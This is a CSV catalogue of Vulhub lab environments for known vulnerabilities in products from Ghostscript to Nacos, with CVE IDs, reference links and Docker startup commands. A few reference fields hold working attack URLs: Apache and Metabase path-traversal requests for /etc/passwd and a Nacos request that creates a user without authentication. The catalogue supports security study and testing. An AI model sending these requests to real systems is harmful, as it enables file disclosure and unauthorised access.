Name,CVE,Description,References,Path,Type,Startup,Vector
ghostscript,CVE-2019-6116,GhostScript Sandbox Bypass Command Execution (CVE-2019-6116),"https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2
https://www.anquanke.com/post/id/170255",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116,docker-compose,docker compose up,remote
git,CVE-2017-8386,GIT-SHELL Sandbox Bypass Leads to RCE (CVE-2017-8386),"https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/
https://www.leavesongs.com/PENETRATION/git-shell-cve-2017-8386.html",https://github.com/vulhub/vulhub/tree/master/git/CVE-2017-8386,docker-compose,docker compose up,remote
gitea,Unknown,Gitea 1.4.0 Directory Traversal Leading to Remote Command Execution,"https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html",unknown,docker-compose,docker compose up,remote
gitlab,CVE-2016-9086,GitLab Arbitrary File Disclosure (CVE-2016-9086),"https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/
https://hackerone.com/reports/178152
http://paper.seebug.org/104/",https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2016-9086,docker-compose,docker compose up,remote
gitlab,CVE-2021-22205,GitLab Pre-Auth Remote Command Execution (CVE-2021-22205),"https://hackerone.com/reports/1154542
https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml
http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2021-22205,docker-compose,docker compose up,remote
gitlist,CVE-2018-1000533,GitList 0.6.0 Remote Command Execution (CVE-2018-1000533),"https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322
https://www.exploit-db.com/exploits/44548
https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html",https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533,docker-compose,docker compose up,remote
gitlist,Unknown,"redirect to gitlist/CVE-2018-1000533
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
glassfish,CVE-2017-1000028,GlassFish 4.1.0 Arbitrary File Read (CVE-2017-1000028),"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html",https://github.com/vulhub/vulhub/tree/master/glassfish/CVE-2017-1000028,docker-compose,docker compose up,remote
goahead,CVE-2021-42342,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2021-42342),"https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562
https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/
https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg
http://target-ip:8080/cgi-bin/index",https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2021-42342,docker-compose,docker compose up,remote
goahead,CVE-2017-17562,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2017-17562),"https://www.elttam.com.au/blog/goahead/
https://www.exploit-db.com/exploits/43360
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb",https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562,docker-compose,docker compose up,remote
gogs,CVE-2018-18925,Gogs Session Overwrite and Arbitrary User Forge (CVE-2018-18925),"https://github.com/gogs/gogs/issues/5469
https://xz.aliyun.com/t/3168
https://www.anquanke.com/post/id/163575",https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925,docker-compose,docker compose up,remote
gradio,CVE-2023-51449,Gradio File Path Traversal (CVE-2023-51449),"https://github.com/gradio-app/gradio/pull/6833
https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2",https://github.com/vulhub/vulhub/tree/master/gradio/CVE-2023-51449,docker-compose,docker compose up,remote
gradio,CVE-2024-1561,Gradio Arbitrary File Read (CVE-2024-1561),"https://github.com/gradio-app/gradio/pull/6884
https://nvd.nist.gov/vuln/detail/CVE-2024-1561",https://github.com/vulhub/vulhub/tree/master/gradio/CVE-2024-1561,docker-compose,docker compose up,remote
grafana,Unknown,Grafana Admin Portal SSRF,"https://github.com/RandomRobbieBF/grafana-ssrf
http://your-ip:3000
http://example.interact.sh/attack",unknown,docker-compose,docker compose up,remote
grafana,CVE-2021-43798,Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798),"https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
https://twitter.com/hacker_/status/1467880514489044993
https://nosec.org/home/detail/4914.html
https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw",https://github.com/vulhub/vulhub/tree/master/grafana/CVE-2021-43798,docker-compose,docker compose up,remote
h2database,CVE-2022-23221,H2 Database Web Console Pre-Auth JDBC Attack RCE (CVE-2022-23221),"https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf
https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html
https://github.com/h2database/h2database/releases/tag/version-2.1.210
https://github.com/h2database/h2database/pull/1580
https://github.com/h2database/h2database/pull/1726",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2022-23221,docker-compose,docker compose up,remote
h2database,CVE-2021-42392,H2 Database Web Console Pre-Auth JNDI Injection RCE (CVE-2021-42392),"https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/
https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e
https://github.com/h2database/h2database/commit/b24aa46f48904ce64443f8f4353d70a2eed09037
https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2021-42392,docker-compose,docker compose up,remote
h2database,CVE-2018-10054,H2 Database Web Console Authentication Remote Code Execution (CVE-2018-10054),"https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
https://www.exploit-db.com/exploits/45506
https://github.com/h2database/h2database/issues/1225
https://github.com/h2database/h2database/pull/1580
https://github.com/h2database/h2database/pull/1726",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2018-10054,docker-compose,docker compose up,remote
hadoop,Unknown,Hadoop YARN ResourceManager Unauthorized Access,"http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html",unknown,docker-compose,docker compose up,remote
hertzbeat,CVE-2024-42323,Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323),"https://forum.butian.net/article/612
https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx
https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md",https://github.com/vulhub/vulhub/tree/master/hertzbeat/CVE-2024-42323,docker-compose,docker compose up,remote
httpd,Unknown,"[deprecated] 绝版apache+php

允许HTTP HOST里插入恶意字符的Apache，已绝版，用该Dockerfile生成的新的Apache没有该特效，该Dockerfile只是演示当初这个镜像是怎么生成的。

镜像地址：vulhub/httpd:bad-http
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
httpd,CVE-2021-42013,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013),"https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/roman_soft/status/1446252280597078024
http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-42013,docker-compose,docker compose up,remote
httpd,CVE-2021-41773,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773),"https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/ptswarm/status/1445376079548624899
https://twitter.com/HackerGautam/status/1445412108863041544
https://twitter.com/snyff/status/1445565903161102344
http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773,docker-compose,docker compose up,remote
httpd,CVE-2021-40438,Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438),"https://httpd.apache.org/security/vulnerabilities_24.html
https://firzen.de/building-a-poc-for-cve-2021-40438
https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-40438,docker-compose,docker compose up,remote
httpd,Unknown,Apache HTTP Server SSI Remote Command Execution,,unknown,docker-compose,docker compose up,remote
httpd,CVE-2017-15715,Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715),"https://httpd.apache.org/security/vulnerabilities_24.html
https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715,docker-compose,docker compose up,remote
httpd,Unknown,Apache HTTPD Multiple Extension Parsing Vulnerability,,unknown,docker-compose,docker compose up,remote
hugegraph,CVE-2024-27348,Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348),"https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348
https://github.com/Zeyad-Azima/CVE-2024-27348",https://github.com/vulhub/vulhub/tree/master/hugegraph/CVE-2024-27348,docker-compose,docker compose up,remote
hugegraph,CVE-2024-43441,Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441),"https://github.com/advisories/GHSA-f697-gm3h-xrf9
https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246",https://github.com/vulhub/vulhub/tree/master/hugegraph/CVE-2024-43441,docker-compose,docker compose up,remote
imagemagick,CVE-2022-44268,ImageMagick Arbitrary File Disclosure (CVE-2022-44268),"https://www.metabaseq.com/imagemagick-zero-days/
https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06",https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268,docker-compose,docker compose up,remote
imagemagick,CVE-2020-29599,ImageMagick Shell Injection via PDF Password (CVE-2020-29599),https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html,https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2020-29599,docker-compose,docker compose up,remote
imagemagick,Unknown,"Page Moved

The ""imagetragick"" issue is moved to CVE-2016-3714
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
imagemagick,CVE-2016-3714,ImageMagick Imagetragick Command Injection (CVE-2016–3714),"https://imagetragick.com
https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
https://github.com/ImageTragick/PoCs",https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2016-3714,docker-compose,docker compose up,remote
influxdb,CVE-2019-20933,InfluxDB Empty JWT Secret Key Authentication Bypass (CVE-2019-20933),"https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
https://github.com/influxdata/influxdb/issues/12927
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings
https://jwt.io/",https://github.com/vulhub/vulhub/tree/master/influxdb/CVE-2019-20933,docker-compose,docker compose up,remote
ingress-nginx,CVE-2025-1974,Kubernetes Ingress-NGINX Unauthenticated Remote Code Execution (CVE-2025-1974),"https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/
https://github.com/yoshino-s/CVE-2025-1974
https://github.com/Clifford-prog/IngressNightmare-PoC
https://github.com/kubernetes/ingress-nginx/blob/8c1ecd7655bd052a26e64d3361dede3096cd80c6/internal/ingress/controller/controller.go#L425
https://localhost:30443/networking/v1/ingresses
http://localhost:30080/fake/addr",https://github.com/vulhub/vulhub/tree/master/ingress-nginx/CVE-2025-1974,docker-compose,docker compose up,remote
jackson,CVE-2017-7525,Jackson-databind Deserialization Remote Command Execution (CVE-2017-7525),"http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd",https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525,docker-compose,docker compose up,remote
java,Unknown,Java RMI Codebase Remote Code Execution,"https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.html
https://paper.seebug.org/1091/",unknown,docker-compose,docker compose up,remote
java,Unknown,Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution,"https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server
https://github.com/frohoff/ysoserial",unknown,docker-compose,docker compose up,remote
java,Unknown,Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass,"https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/
https://github.com/wh1t3p1g/ysoserial
http://xxxxx.burpcollaborator.net""",unknown,docker-compose,docker compose up,remote
jboss,CVE-2017-12149,JBoss 5.x/6.x Deserialization Remote Code Execution (CVE-2017-12149),"https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg
https://access.redhat.com/security/cve/cve-2017-12149
http://www.jackson-t.ca/runtime-exec-payloads.html",https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149,docker-compose,docker compose up,remote
jboss,Unknown,JBoss JMXInvokerServlet Deserialization Remote Code Execution,"https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://www.seebug.org/vuldb/ssvid-89723
http://www.freebuf.com/sectool/88908.html
https://paper.seebug.org/312/",unknown,docker-compose,docker compose up,remote
jboss,CVE-2017-7504,JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504),"https://github.com/joaomatosf/JavaDeserH2HC
https://www.youtube.com/watch?v=jVMr4eeJ2Po
http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet",https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-7504,docker-compose,docker compose up,remote
jenkins,CVE-2024-23897,Jenkins Arbitrary File Read Through the CLI (CVE-2024-23897),"https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw
http://localhost:8080/
http://localhost:8080/
http://localhost:8080/
http://localhost:8080/",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897,docker-compose,docker compose up,remote
jenkins,CVE-2018-1000861,Jenkins Remote Code Execution (CVE-2018-1000861),"http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861,docker-compose,docker compose up,remote
jenkins,CVE-2017-1000353,Jenkins Remote Code Execution (CVE-2017-1000353),"https://www.jenkins.io/security/advisory/2017-04-26/
https://www.exploit-db.com/exploits/41965
http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2017-1000353,docker-compose,docker compose up,remote
jetty,CVE-2021-28164,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164),"https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
https://xz.aliyun.com/t/10039",https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164,docker-compose,docker compose up,remote
jetty,CVE-2021-34429,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429),"https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm
https://xz.aliyun.com/t/10039",https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-34429,docker-compose,docker compose up,remote
jetty,CVE-2021-28169,Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability (CVE-2021-28169),https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq,https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28169,docker-compose,docker compose up,remote
jimureport,CVE-2023-4450,JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450),"https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
https://whoopsunix.com/docs/java/named%20module/
https://www.reajason.eu.org/writing/freemarkersstimemshell/",https://github.com/vulhub/vulhub/tree/master/jimureport/CVE-2023-4450,docker-compose,docker compose up,remote
jira,CVE-2019-11581,Atlassian Jira Template Injection (CVE-2019-11581),"https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html
https://jira.atlassian.com/browse/JRASERVER-69532
https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw",https://github.com/vulhub/vulhub/tree/master/jira/CVE-2019-11581,docker-compose,docker compose up,remote
jmeter,CVE-2018-1297,Apache JMeter RMI Deserialization Remote Code Execution (CVE-2018-1297),,https://github.com/vulhub/vulhub/tree/master/jmeter/CVE-2018-1297,docker-compose,docker compose up,remote
joomla,CVE-2015-8562,Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562),"https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html
https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562,docker-compose,docker compose up,remote
joomla,CVE-2017-8917,Joomla 3.7.0 com_fields SQL Injection Vulnerability (CVE-2017-8917),"https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html
https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917,docker-compose,docker compose up,remote
joomla,CVE-2023-23752,Joomla improper access check in webservice endpoints (CVE-2023-23752),"https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
https://xz.aliyun.com/t/12175
https://vulncheck.com/blog/joomla-for-rce",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2023-23752,docker-compose,docker compose up,remote
jumpserver,CVE-2023-42820,Jumpserver random seed leakage and account takeover (CVE-2023-42820),"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp
https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw
https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html
http://localhost:8080",https://github.com/vulhub/vulhub/tree/master/jumpserver/CVE-2023-42820,docker-compose,docker compose up,remote
jupyter,Unknown,Jupyter Notebook Unauthorized Access,,unknown,docker-compose,docker compose up,remote
kafka,CVE-2023-25194,Apache Kafka Clients JNDI injection RCE (CVE-2023-25194),"https://nvd.nist.gov/vuln/detail/CVE-2023-25194
https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml
https://hackerone.com/reports/1529790",https://github.com/vulhub/vulhub/tree/master/kafka/CVE-2023-25194,docker-compose,docker compose up,remote
kibana,CVE-2019-7609,Kibana Prototype Pollution Leads to Remote Code Execution (CVE-2019-7609),"https://nvd.nist.gov/vuln/detail/CVE-2019-7609
https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
https://slides.com/securitymb/prototype-pollution-in-kibana/#/4",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2019-7609,docker-compose,docker compose up,remote
kibana,CVE-2020-7012,Kibana 7.6.2 upgrade-assistant-telemetry Prototype Pollution Leads to RCE (CVE-2020-7012),"https://hackerone.com/reports/852613
https://discuss.elastic.co/t/elastic-stack-6-8-9-and-7-7-0-security-update/235571",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2020-7012,docker-compose,docker compose up,remote
kibana,CVE-2018-17246,Kibana Local File Inclusion (CVE-2018-17246),"https://nvd.nist.gov/vuln/detail/CVE-2018-17246
https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246,docker-compose,docker compose up,remote
kkfileview,Unknown,kkFileView ZipSlip Remote Code Execution,https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC,unknown,docker-compose,docker compose up,remote
langflow,CVE-2025-3248,Langflow validate/code API Pre-Auth Remote Code Execution (CVE-2025-3248),"https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/
https://github.com/langflow-ai/langflow/releases/tag/1.3.0
https://github.com/langflow-ai/langflow/pull/6911",https://github.com/vulhub/vulhub/tree/master/langflow/CVE-2025-3248,docker-compose,docker compose up,remote
laravel,CVE-2021-3129,Laravel Ignition 2.5.1 Remote Code Execution (CVE-2021-3129),"https://www.ambionics.io/blog/laravel-debug-rce
https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g",https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129,docker-compose,docker compose up,remote
librsvg,CVE-2023-38633,Librsvg XInclude Arbitrary file reading (CVE-2023-38633),"https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/
https://gitlab.gnome.org/GNOME/librsvg/-/issues/996",https://github.com/vulhub/vulhub/tree/master/librsvg/CVE-2023-38633,docker-compose,docker compose up,remote
libssh,CVE-2018-10933,libssh Authentication Bypass Vulnerability(CVE-2018-10933),"https://www.libssh.org/security/advisories/CVE-2018-10933.txt
https://www.seebug.org/vuldb/ssvid-97614
https://www.seebug.org/vuldb/ssvid-97614,",https://github.com/vulhub/vulhub/tree/master/libssh/CVE-2018-10933,docker-compose,docker compose up,remote
liferay-portal,CVE-2020-7961,Liferay Portal CE Deserialization Remote Code Execution (CVE-2020-7961),"https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/
https://xz.aliyun.com/t/7499
https://xz.aliyun.com/t/7485
http://evil/",https://github.com/vulhub/vulhub/tree/master/liferay-portal/CVE-2020-7961,docker-compose,docker compose up,remote
log4j,CVE-2017-5645,Apache Log4j TCP Server Deserialization Remote Code Execution (CVE-2017-5645),"https://issues.apache.org/jira/browse/LOG4J2-1863
https://github.com/pimps/CVE-2017-5645",https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2017-5645,docker-compose,docker compose up,remote
log4j,CVE-2021-44228,Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228),"https://logging.apache.org/log4j/2.x/security.html
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://xz.aliyun.com/t/10649",https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228,docker-compose,docker compose up,remote
magento,Unknown,Magento 2.2 SQL Injection,"https://www.ambionics.io/blog/magento-sqli
https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html",unknown,docker-compose,docker compose up,remote
metabase,CVE-2023-38646,Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646),"https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA",https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2023-38646,docker-compose,docker compose up,remote
metabase,CVE-2021-41277,Metabase Pre-Auth Local File Inclusion (CVE-2021-41277),"https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
https://github.com/tahtaciburak/CVE-2021-41277
http://your-ip:3000/api/geojson?url=file:////etc/passwd",https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2021-41277,docker-compose,docker compose up,remote
metersphere,Unknown,MeterSphere Plugin Endpoint Remote Code Execution,"https://xz.aliyun.com/t/10772
https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0",unknown,docker-compose,docker compose up,remote
metersphere,CVE-2021-45788,MeterSphere v1.15.4 Authenticated SQL Injection (CVE-2021-45788),https://github.com/metersphere/metersphere/issues/8651,https://github.com/vulhub/vulhub/tree/master/metersphere/CVE-2021-45788,docker-compose,docker compose up,remote
mini_httpd,CVE-2018-18778,ACME mini_httpd Arbitrary File Read (CVE-2018-18778),"https://nvd.nist.gov/vuln/detail/CVE-2018-18778
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-18778.yaml",https://github.com/vulhub/vulhub/tree/master/mini_httpd/CVE-2018-18778,docker-compose,docker compose up,remote
minio,CVE-2023-28432,MinIO Information Disclosure in Cluster Deployment (CVE-2023-28432),"https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ",https://github.com/vulhub/vulhub/tree/master/minio/CVE-2023-28432,docker-compose,docker compose up,remote
mojarra,Unknown,Mojarra JSF ViewState Deserialization Vulnerability,"https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
https://www.exploit-db.com/docs/48126
https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf",unknown,docker-compose,docker compose up,remote
mongo-express,CVE-2019-10758,Mongo Express Remote Code Execution (CVE-2019-10758),,https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758,docker-compose,docker compose up,remote
mysql,CVE-2012-2122,MySQL Authentication Bypass (CVE-2012-2122),"http://www.freebuf.com/vuls/3815.html
https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/",https://github.com/vulhub/vulhub/tree/master/mysql/CVE-2012-2122,docker-compose,docker compose up,remote
nacos,CVE-2021-29442,Alibaba Nacos Authentication Bypass and Remote Code Execution (CVE-2021-29442),"https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
https://github.com/alibaba/nacos/issues/4463
https://github.com/ayoundzw/nacos-poc
http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce
http://your-ip:8848",https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29442,docker-compose,docker compose up,remote
nacos,CVE-2021-29441,Nacos Authentication Bypass(CVE-2021-29441),"https://github.com/advisories/GHSA-36hp-jr8h-556f
http://target:8848
http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub
http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
http://target:8848/nacos/",https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29441,docker-compose,docker compose up,remote
